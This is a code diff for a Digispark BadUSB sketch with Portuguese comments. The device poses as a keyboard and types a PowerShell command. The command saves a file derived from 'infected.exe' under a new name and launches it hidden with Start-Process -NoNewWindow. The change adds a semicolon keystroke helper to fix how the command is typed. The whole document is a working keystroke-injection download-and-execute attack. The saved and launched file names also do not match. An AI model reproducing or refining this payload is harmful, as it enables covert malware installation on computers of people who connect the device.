@@ -14,6 +14,10 @@ void sendQuotes() {
   DigiKeyboard.sendKeyStroke(53);  // "Aspas"
 }
 
+void sendPointv(){
+  DigiKeyboard.sendKeyStroke(56); // ;
+}
+
 void setup() {
   DigiKeyboard.sendKeyStroke(0);
   pinMode(1, OUTPUT);
@@ -41,7 +45,9 @@ void setup() {
   sendSlash();
   DigiKeyboard.print("Serviços Windows infected.exe");
   sendQuotes();
-  DigiKeyboard.print("-Outfile Texte.exe; Start-Process -NoNewWindow -FilePath .");
+  DigiKeyboard.print("-Outfile Texte.exe");
+  sendPointv();
+  DigiKeyboard.print("Start-Process -NoNewWindow -FilePath .");
   sendSlash();
   DigiKeyboard.print("Teste.exe");
   digitalWrite(1, LOW);
@@ -50,4 +56,3 @@ void setup() {
 void loop() {
   // Nada necessário aqui
 }
-
